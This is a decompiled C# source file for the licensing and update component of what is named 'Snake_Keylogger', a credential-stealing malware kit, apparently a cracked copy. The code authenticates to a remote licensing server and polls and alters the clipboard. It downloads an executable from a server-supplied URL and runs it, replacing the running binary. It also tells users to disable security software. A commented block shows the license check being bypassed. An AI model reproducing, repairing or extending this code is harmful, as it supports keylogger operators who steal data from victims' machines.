using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;


namespace Snake_Keylogger.snakesystem
{
	// Token: 0x0200000B RID: 11
	internal class CodeVest
	{
		// Token: 0x14000001 RID: 1
		// (add) Token: 0x0600004F RID: 79 RVA: 0x000040F8 File Offset: 0x000022F8
		// (remove) Token: 0x06000050 RID: 80 RVA: 0x00004130 File Offset: 0x00002330
		public event CodeVest.RunHookHandler RunHookSuccess;

        public static Updatessss updateForm = new Updatessss();
        public static Form1 mainForm = new Form1();

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x06000051 RID: 81 RVA: 0x00004168 File Offset: 0x00002368
		// (remove) Token: 0x06000052 RID: 82 RVA: 0x000041A0 File Offset: 0x000023A0
		public event CodeVest.RunHookHandler RunHookFail;

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x06000053 RID: 83 RVA: 0x000041D8 File Offset: 0x000023D8
		public string UserName
		{
			get
			{
				return this._Username;
			}
		}

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x06000054 RID: 84 RVA: 0x000041F4 File Offset: 0x000023F4
		public DateTime ExpirationDate
		{
			get
			{
				return this.valid_till;
			}
		}

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000055 RID: 85 RVA: 0x00004210 File Offset: 0x00002410
		public TimeSpan TimeRemaining
		{
			get
			{
				bool flag =this.valid_till.Subtract(DateTime.Now).Days < 0;
				TimeSpan timeSpan;
				if (flag)
				{
					timeSpan = TimeSpan.Zero;
				}
				else
				{
					timeSpan =this.valid_till.Subtract(DateTime.Now);
				}
				return timeSpan;
			}
		}

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x06000056 RID: 86 RVA: 0x00004264 File Offset: 0x00002464
		public CodeVest.LicenseTypes LicenseType
		{
			get
			{
				return this._license_type;
			}
		}

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x06000057 RID: 87 RVA: 0x00004280 File Offset: 0x00002480
		public bool LicenseExpires
		{
			get
			{
				return true;
			}
		}

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x06000058 RID: 88 RVA: 0x00004298 File Offset: 0x00002498
		public string MachineId
		{
			get
			{
				return this.hardwareId;
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000022DA File Offset: 0x000004DA
		public CodeVest()
		{
		this._Version = new Version(0, 2, 1, 1);
			CodeVest.cv = this;
		this._PreferredMetadataEndPoint = "https://codevest.to/codevest_api.php";
		this._AlternateMetadataEndPoint = "http://codevest.to/codevest_api2.php";
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00002313 File Offset: 0x00000513
		public void Initialize(string productId, string key)
		{
		    this.Initialize(productId, key, new CodeVest.codeVestSettings());
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000042B4 File Offset: 0x000024B4
        public static ThreadStart ctt;
		public static void ClipboardTimerHandler(object sender, ElapsedEventArgs e)
		{
			Thread thread = new Thread((ctt == null) ? (ctt = delegate()
			{
				bool dataPresent = Clipboard.GetDataObject().GetDataPresent(DataFormats.Text);
				if (dataPresent)
				{
					string text = Clipboard.GetText();
					bool flag = (Operators.CompareString(text, Encoding.ASCII.GetString(CodeVest._PrivateKey_new), false) == 0) | (Operators.CompareString(text, Encoding.ASCII.GetString(CodeVest._PrivateKey_first), false) == 0);
					if (flag)
					{
						Clipboard.SetText(text.Substring(0, 5) + text.Substring(6));
					}
				}
			}) : ctt);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x0600005C RID: 92 RVA: 0x00002324 File Offset: 0x00000524
		// (set) Token: 0x0600005D RID: 93 RVA: 0x0000430C File Offset: 0x0000250C
        private WebClient _client;
		public virtual WebClient client
		{
			get
			{
				return this.client;
			}
			set
			{
				DownloadProgressChangedEventHandler downloadProgressChangedEventHandler = new DownloadProgressChangedEventHandler(this.download_progress);
				WebClient webClient = this.client;
				if (webClient != null) { webClient.DownloadProgressChanged -= downloadProgressChangedEventHandler; }
			    this.client = value;
                webClient =this.client;
				if (webClient != null) { webClient.DownloadProgressChanged += downloadProgressChangedEventHandler; }
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00004358 File Offset: 0x00002558
		public void updateApp(string url)
		{
		this.client = new WebClient();
			try
			{
				if (url.Substring(0, 1) == "@")
				{
					bool flag2 = File.Exists(Path.GetTempPath() + "codevest_update.exe");
					if (flag2)
					{
						File.Delete(Path.GetTempPath() + "codevest_update.exe");
					}
                    new Updatessss().ShowDialog();
				this.client.DownloadFileAsync(new Uri(url.Substring(1)), Path.GetTempPath() + "codevest_update.exe");
				}
				else
				{
				this.client.DownloadFileAsync(new Uri(url), Path.GetTempPath() + "codevest_update.exe");
					Process.Start(Path.GetTempPath() + "codevest_update.exe");
				}
			}
			catch
			{
				MessageBox.Show("The update can't be found, please make sure that any security software is disabled and lastly use a VPN !");
				Environment.Exit(0);
			}
			for (;;)
			{
				Application.DoEvents();
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000449C File Offset: 0x0000269C
		private void download_progress(object sender, DownloadProgressChangedEventArgs e)
		{
			checked
			{
				int num = (int)Math.Round((double)e.BytesReceived / 1000000.0);
				int num2 = (int)Math.Round((double)e.TotalBytesToReceive / 1000000.0);
				updateForm.Label1.Text = string.Concat(new string[]
				{
					"Download:",
					Conversions.ToString(num),
					" MB / ",
					Conversions.ToString(num2),
					"MB"
				});
				updateForm.ProgressBar1.Value = e.ProgressPercentage;
				updateForm.Label2.Text = Conversions.ToString(updateForm.ProgressBar1.Value) + "%";
				if (updateForm.ProgressBar1.Value == 0x64)
				{
					try
					{
						if (File.Exists(Path.GetTempPath() + "codevest_update.exe"))
						{
							string text = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
							if (File.Exists(text + ".bck")) { File.Delete(text + ".bck"); }
							File.Move(text, text + ".bck");
							File.Move(Path.GetTempPath() + "codevest_update.exe", text);
							if (File.Exists(text)) { Process.Start(text); }
							else
							{
								Interaction.MsgBox("There seems to be an error, make sure any security software is disabled, lastly use a VPN !", MsgBoxStyle.OkOnly, null);
							}
							Environment.Exit(0);
						}
					}
					catch { }
				}
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000046AC File Offset: 0x000028AC
		public void Initialize(string productId, string Privatekey, CodeVest.codeVestSettings settings)
		{
			if (this._Authenticator != null) { throw new Exception("Loader has already been initialized."); }
			if (settings == null) { throw new ArgumentNullException("settings"); }
		this._k = "";
		this._ProductId = productId;
		this._PrivateKey = Privatekey;
			CodeVest._timer = new System.Timers.Timer(3000.0);
			CodeVest._timer.Elapsed += CodeVest.ClipboardTimerHandler;
			CodeVest._timer.Enabled = true;
			CodeVest._PrivateKey_first = Encoding.ASCII.GetBytes(FingerPrint.GetMD5("o6806a42kbM7c5K%!>" + Privatekey).Substring(0, 0xE));
			CodeVest._PrivateKey_new = CodeVest._PrivateKey_first;
		this.hardwareId = FingerPrint.Value();
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			for (;;)
			{
				if (nameValueCollection2["success"] == "1") { break; }
				Login login = new Login();
				DialogResult dialogResult = login.ShowDialog();
				bool flag4 = dialogResult == DialogResult.OK;
				if (flag4)
				{
					nameValueCollection["username"] = login.username;
					nameValueCollection["password"] = login.password;
					nameValueCollection["fn"] = "login";
					nameValueCollection2 =this.HTTP_request(nameValueCollection);
					bool flag5 = Operators.CompareString(nameValueCollection2["error"], "1", false) == 0;
					if (flag5)
					{
						MessageBox.Show(nameValueCollection2["msg"]);
					}
				}
				else
				{
					Environment.Exit(-1);
				}
			}
			bool flag6 = Operators.CompareString(nameValueCollection2["startup_message"], "", false) != 0;
			if (flag6)
			{
				MessageBox.Show(nameValueCollection2["startup_message"]);
			}
			DateTime.TryParse(nameValueCollection2["valid_till"], out this.valid_till);
		this._license_type = (CodeVest.LicenseTypes)Conversions.ToByte(Enum.Parse(typeof(CodeVest.LicenseTypes), nameValueCollection2["license_type"]));
			CodeVest.mainForm.MetroLabel23.Text = nameValueCollection2["valid_till"].Replace("00:00:00", "");
		this._Username = nameValueCollection["username"];
		this._Password = nameValueCollection["password"];
			if (nameValueCollection2["last_version"] != Assembly.GetEntryAssembly().GetName().Version.ToString(4))
			{
				if (nameValueCollection2["force_update"] != "2")
				{
					if (nameValueCollection2["force_update"] == "1")
					{
					    this.updateApp(nameValueCollection2["update_url"]);
					}
					else
					{
						if (MessageBox.Show(string.Concat(new string[]
						{
							"New version available. Do you want to update from",
							Assembly.GetEntryAssembly().GetName().Version.ToString(4),
							" to ",
							nameValueCollection2["last_version"],
							"?"
						}), "CodeVest", MessageBoxButtons.YesNo) == DialogResult.Yes)
						{
						this.updateApp(nameValueCollection2["update_url"]);
						}
					}
				}
			}
            CodeVest.mainForm.ShowDialog();
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00004A60 File Offset: 0x00002C60
		public void runHook()
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			nameValueCollection["username"] =this._Username;
			nameValueCollection["password"] =this._Password;
			nameValueCollection["fn"] = "login";
			nameValueCollection2 =this.HTTP_request(nameValueCollection);
			if (nameValueCollection2["error"] == "1")
			{
				CodeVest.RunHookHandler runHookFailEvent = this.RunHookFail;
				if (runHookFailEvent != null)
				{
					runHookFailEvent(this, new EventArgs());
				}
			}
			else
			{
				CodeVest.RunHookHandler runHookSuccessEvent = this.RunHookSuccess;
				if (runHookSuccessEvent != null)
				{
					runHookSuccessEvent(this, new EventArgs());
				}
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00004B24 File Offset: 0x00002D24
		public string getGlobalSecureVariable(string name)
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			nameValueCollection["fn"] = "getVar";
			nameValueCollection["varName"] = name;
			nameValueCollection2 =this.HTTP_request(nameValueCollection);
			bool flag = Operators.CompareString(nameValueCollection2["success"], "1", false) == 0;
			string text;
			if (flag)
			{
				text = nameValueCollection2["value"];
			}
			else
			{
				text = "";
			}
			return text;
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00004BB0 File Offset: 0x00002DB0
		public string getSecureVariable(string name)
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			nameValueCollection["username"] =this._Username;
			nameValueCollection["password"] =this._Password;
			nameValueCollection["fn"] = "getVar";
			nameValueCollection["varName"] = name;
			nameValueCollection2 =this.HTTP_request(nameValueCollection);
			bool flag = Operators.CompareString(nameValueCollection2["success"], "1", false) == 0;
			string text;
			if (flag)
			{
				text = nameValueCollection2["value"];
			}
			else
			{
				text = "";
			}
			return text;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00004C64 File Offset: 0x00002E64
		public bool setSecureVariable(string name, string value)
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			nameValueCollection["username"] =this._Username;
			nameValueCollection["password"] =this._Password;
			nameValueCollection["fn"] = "setVar";
			nameValueCollection["varName"] = name;
			nameValueCollection["varValue"] = value;
			nameValueCollection2 =this.HTTP_request(nameValueCollection);
			return Operators.CompareString(nameValueCollection2["success"], "1", false) == 0;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00004D18 File Offset: 0x00002F18
		public bool blocLicense()
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			nameValueCollection["username"] =this._Username;
			nameValueCollection["password"] =this._Password;
			nameValueCollection["fn"] = "blockLic";
			nameValueCollection2 =this.HTTP_request(nameValueCollection);
			return Operators.CompareString(nameValueCollection2["success"], "1", false) == 0;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00004DAC File Offset: 0x00002FAC
		public bool setGlobalSecureVariable(string name, string value)
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			nameValueCollection["fn"] = "setVar";
			nameValueCollection["varName"] = name;
			nameValueCollection["varValue"] = value;
			nameValueCollection2 =this.HTTP_request(nameValueCollection);
			return Operators.CompareString(nameValueCollection2["success"], "1", false) == 0;
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00004E38 File Offset: 0x00003038
		public NameValueCollection HTTP_request(NameValueCollection values)
		{
			/*if (values["fn"] == "login")
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["startup_message"] = "Cracked by bfalk escobark - @Runcrime";
				nameValueCollection["valid_till"] = "31/12/9999 23:59:59";
				nameValueCollection["license_type"] = "Diamond";
				nameValueCollection["success"] = "1";
				return nameValueCollection;
			}*/
			WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection2 = new NameValueCollection();
			NameValueCollection nameValueCollection3 = new NameValueCollection();
			NameValueCollection nameValueCollection4 = new NameValueCollection();
			webClient.Proxy = new WebProxy();
			nameValueCollection4["hardware_id"] =this.hardwareId;
			nameValueCollection4["hid"] = FingerPrint.fingerPrintDebug;
			nameValueCollection4["fn"] = "get_key";
			if (Operators.CompareString(values["username"], "", false) != 0)
			{
			this._Username = values["username"];
			this._Password = values["password"];
			}
			nameValueCollection4["username"] =this._Username;
			nameValueCollection4["password"] =this._Password;
			string text = "";
			checked
			{
				int num = nameValueCollection4.AllKeys.Count<string>() - 1;
				for (int i = 0; i <= num; i++)
				{
					text = string.Concat(new string[]
					{
						text,
						nameValueCollection4.GetKey(i),
						"=",
						nameValueCollection4.Get(i).Replace("\n", "\r\r"),
						"\n"
					});
				}
				nameValueCollection2.Add("data",this.EncryptStringAES(text,this._PrivateKey));
				byte[] array = webClient.UploadValues(string.Concat(new string[]
				{
				this._PreferredMetadataEndPoint,
					"?p_id=",
				this._ProductId,
					"&v=",
				this._Version.ToString(4),
					"&k=",
				this._k,
					"&get_key=1"
				}), "POST", nameValueCollection2);
				string text2 = Encoding.ASCII.GetString(array);
				string text3 =this.DecryptStringAES(text2,this._PrivateKey);
				if ((text3.Length > 5) & ((text3.IndexOf("ror=1") < 1) & (text3.IndexOf("ccess=1") < 1)))
				{
					CodeVest._PrivateKey_new = CodeVest._PrivateKey_first;
					nameValueCollection3.Add("data",this.EncryptStringAES(text,this._PrivateKey));
					array = webClient.UploadValues(string.Concat(new string[]
					{
					this._PreferredMetadataEndPoint,
						"?p_id=",
					this._ProductId,
						"&v=",
					this._Version.ToString(4),
						"&get_key=1"
					}), "POST", nameValueCollection3);
					text2 = Encoding.ASCII.GetString(array);
					text3 =this.DecryptStringAES(text2,this._PrivateKey);
					if ((text3.Length > 5) & ((text3.IndexOf("ror=1") < 1) & (text3.IndexOf("ccess=1") < 1)))
					{
						MessageBox.Show("Application license error");
						Environment.Exit(1);
					}
				}
				string[] array2 = text3.Split(new char[] { '\n' });
				NameValueCollection nameValueCollection5 = new NameValueCollection();
				foreach (string text4 in array2)
				{
					if (text4.Length > 0 && Operators.CompareString(Conversions.ToString(text4[0]), "\0", false) != 0)
					{
						nameValueCollection5.Set(text4.Split(new char[] { '=' }).ElementAt(0), text4.Split(new char[] { '=' }).ElementAt(1).Replace("\r\r", "\n"));
					}
				}
				if (Operators.CompareString(nameValueCollection5["error"], "1", false) == 0)
				{
					MessageBox.Show(nameValueCollection5["msg"]);
				}
				else
				{
					CodeVest._PrivateKey_new = Encoding.ASCII.GetBytes(nameValueCollection5["key"]);
				this._k = nameValueCollection5["key_id"];
				}
				return this.HTTP_direct_request(values);
			}
		}

		// Token: 0x06000068 RID: 104 RVA: 0x0000525C File Offset: 0x0000345C
		public NameValueCollection HTTP_direct_request(NameValueCollection values)
		{
			WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			webClient.Proxy = new WebProxy();
			values["hardware_id"] =this.hardwareId;
			values["hid"] = FingerPrint.fingerPrintDebug;
			string text = "";
			checked
			{
				int num = values.AllKeys.Count<string>() - 1;
				for (int i = 0; i <= num; i++)
				{
					text = string.Concat(new string[]
					{
						text,
						values.GetKey(i),
						"=",
						values.Get(i).Replace("\n", "\r\\n\r"),
						"\n"
					});
				}
				nameValueCollection.Add("data",this.EncryptStringAES(text,this._PrivateKey));
				byte[] array = webClient.UploadValues(string.Concat(new string[]
				{
				this._PreferredMetadataEndPoint,
					"?p_id=",
				this._ProductId,
					"&v=",
				this._Version.ToString(4),
					"&k=",
				this._k,
					(Operators.CompareString(values["fn"], "get_key", false) == 0) ? "&get_key=1" : ""
				}), "POST", nameValueCollection);
				string @string = Encoding.ASCII.GetString(array);
				string text2 =this.DecryptStringAES(@string,this._PrivateKey);
				bool flag = (text2.Length > 5) & ((text2.IndexOf("ror=1") < 1) & (text2.IndexOf("ccess=1") < 1));
				if (flag)
				{
					MessageBox.Show("Application license error");
					Environment.Exit(1);
				}
				string[] array2 = text2.Split(new char[] { '\n' });
				NameValueCollection nameValueCollection2 = new NameValueCollection();
				foreach (string text3 in array2)
				{
					bool flag2 = text3.Length > 0;
					if (flag2)
					{
						bool flag3 = Operators.CompareString(Conversions.ToString(text3[0]), "\0", false) != 0;
						if (flag3)
						{
							nameValueCollection2.Set(text3.Split(new char[] { '=' }).ElementAt(0), text3.Split(new char[] { '=' }).ElementAt(1).Replace("\r\\n\r", "\n"));
						}
					}
				}
				return nameValueCollection2;
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00005524 File Offset: 0x00003724
		public string EncryptStringAES(string plainText, string sharedSecret)
		{
			bool flag = string.IsNullOrEmpty(plainText);
			if (flag)
			{
				throw new ArgumentNullException("plainText");
			}
			bool flag2 = string.IsNullOrEmpty(sharedSecret);
			if (flag2)
			{
				throw new ArgumentNullException("sharedSecret");
			}
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(sharedSecret, CodeVest._PrivateKey_new);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.BlockSize = 0x100;
			rijndaelManaged.Mode = CipherMode.ECB;
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.IV = Encoding.ASCII.GetBytes("2017+-04+-2017+T+12:12:230000000");
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(checked((int)Math.Round((double)rijndaelManaged.KeySize / 8.0)));
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(rijndaelManaged.Key, rijndaelManaged.IV);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write);
			StreamWriter streamWriter = new StreamWriter(cryptoStream);
			streamWriter.AutoFlush = true;
			streamWriter.Write(plainText);
			streamWriter.Flush();
			cryptoStream.FlushFinalBlock();
			string text = Convert.ToBase64String(memoryStream.ToArray(), Base64FormattingOptions.None);
			bool flag3 = rijndaelManaged != null;
			if (flag3)
			{
				rijndaelManaged.Clear();
			}
			return text;
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00005658 File Offset: 0x00003858
		private static string DecryptStringFromBytes(byte[] cipherText, byte[] key)
		{
			bool flag = cipherText == null || cipherText.Length <= 0;
			if (flag)
			{
				throw new ArgumentNullException("cipherText");
			}
			bool flag2 = key == null || key.Length <= 0;
			if (flag2)
			{
				throw new ArgumentNullException("key");
			}
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.BlockSize = 0x100;
			rijndaelManaged.Key = key;
			rijndaelManaged.Mode = CipherMode.ECB;
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.IV = new byte[0x20];
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
			MemoryStream memoryStream = new MemoryStream(cipherText);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read);
			StreamReader streamReader = new StreamReader(cryptoStream);
			return streamReader.ReadToEnd();
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00005738 File Offset: 0x00003938
		public string DecryptStringAES(string cipherText, string sharedSecret)
		{
			bool flag = string.IsNullOrEmpty(cipherText);
			if (flag)
			{
				throw new ArgumentNullException("cipherText");
			}
			bool flag2 = string.IsNullOrEmpty(sharedSecret);
			if (flag2)
			{
				throw new ArgumentNullException("sharedSecret");
			}
			RijndaelManaged rijndaelManaged = null;
			string text = null;
			try
			{
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(sharedSecret, CodeVest._PrivateKey_new);
				byte[] array = Convert.FromBase64String(cipherText);
				MemoryStream memoryStream = new MemoryStream(array);
				rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(checked((int)Math.Round((double)rijndaelManaged.KeySize / 8.0)));
				rijndaelManaged.BlockSize = 0x100;
				rijndaelManaged.Mode = CipherMode.ECB;
				rijndaelManaged.Padding = PaddingMode.Zeros;
				rijndaelManaged.IV = Encoding.ASCII.GetBytes("2017+-04+-2017+T+12:12:230000000");
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
				CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read);
				StreamReader streamReader = new StreamReader(cryptoStream);
				text = streamReader.ReadToEnd();
			}
			catch (Exception ex)
			{
				MessageBox.Show("Server error or encoding error: " + ex.Message);
			}
			finally
			{
				bool flag3 = rijndaelManaged != null;
				if (flag3)
				{
					rijndaelManaged.Clear();
				}
			}
			return text;
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000058B4 File Offset: 0x00003AB4
		private static byte[] ReadByteArray(Stream s)
		{
			byte[] array = new byte[0];
			bool flag = s.Read(array, 0, array.Length) != array.Length;
			if (flag)
			{
				throw new SystemException("Stream did not contain properly formatted byte array");
			}
			byte[] array2 = new byte[checked(BitConverter.ToInt32(array, 0) - 1 + 1)];
			bool flag2 = s.Read(array2, 0, array2.Length) != array2.Length;
			if (flag2)
			{
				throw new SystemException("Did not read byte array properly");
			}
			return array2;
		}

		// Token: 0x04000011 RID: 17
		public static CodeVest cv = null;

		// Token: 0x04000014 RID: 20
		public DateTime valid_till;

		// Token: 0x04000015 RID: 21
		private static System.Timers.Timer _timer;

		// Token: 0x04000016 RID: 22
		private CodeVest.LicenseTypes _license_type;

		// Token: 0x04000017 RID: 23
		private Version _Version;

		// Token: 0x04000018 RID: 24
		private string _PreferredMetadataEndPoint;

		// Token: 0x04000019 RID: 25
		private string _AlternateMetadataEndPoint;

		// Token: 0x0400001A RID: 26
		private object _Authenticator;

		// Token: 0x0400001B RID: 27
		private string _k;

		// Token: 0x0400001C RID: 28
		private string _ProductDirectory;

		// Token: 0x0400001D RID: 29
		private string _ProductId;

		// Token: 0x0400001E RID: 30
		private string _PrivateKey;

		// Token: 0x0400001F RID: 31
		private string _Username;

		// Token: 0x04000020 RID: 32
		private string _Password;

		// Token: 0x04000021 RID: 33
		public string hardwareId;

		// Token: 0x04000022 RID: 34
		private static byte[] _PrivateKey_first;

		// Token: 0x04000023 RID: 35
		private static byte[] _PrivateKey_new;

		// Token: 0x0200000C RID: 12
		// (Invoke) Token: 0x06000070 RID: 112
		public delegate void RunHookHandler(object sender, EventArgs e);

		// Token: 0x0200000D RID: 13
		public enum LicenseTypes : byte
		{
			// Token: 0x04000028 RID: 40
			Special,
			// Token: 0x04000029 RID: 41
			Bronze,
			// Token: 0x0400002A RID: 42
			Silver,
			// Token: 0x0400002B RID: 43
			Gold,
			// Token: 0x0400002C RID: 44
			Platinum,
			// Token: 0x0400002D RID: 45
			Diamond
		}

		// Token: 0x0200000E RID: 14
		public sealed class codeVestSettings
		{
			// Token: 0x1700002E RID: 46
			// (get) Token: 0x06000071 RID: 113 RVA: 0x00005934 File Offset: 0x00003B34
			// (set) Token: 0x06000072 RID: 114 RVA: 0x00002331 File Offset: 0x00000531
            public bool CatchUnhandledExceptions { get; set; }

			// Token: 0x1700002F RID: 47
			// (get) Token: 0x06000073 RID: 115 RVA: 0x00005934 File Offset: 0x00003B34
			// (set) Token: 0x06000074 RID: 116 RVA: 0x00002331 File Offset: 0x00000531
            public bool DeferAutomaticUpdates { get; set; }
			// Token: 0x17000030 RID: 48
			// (get) Token: 0x06000075 RID: 117 RVA: 0x00005934 File Offset: 0x00003B34
			// (set) Token: 0x06000076 RID: 118 RVA: 0x00002331 File Offset: 0x00000531
            public bool SilentAuthentication { get; set; }

			// Token: 0x17000031 RID: 49
			// (get) Token: 0x06000077 RID: 119 RVA: 0x00005934 File Offset: 0x00003B34
			// (set) Token: 0x06000078 RID: 120 RVA: 0x00002331 File Offset: 0x00000531
            public bool VerifyRuntimeIntegrity { get; set; }

			// Token: 0x06000079 RID: 121 RVA: 0x00002334 File Offset: 0x00000534
			public codeVestSettings()
			{
			    this.CatchUnhandledExceptions = true;
			    this.VerifyRuntimeIntegrity = true;
			}
		}
	}
}
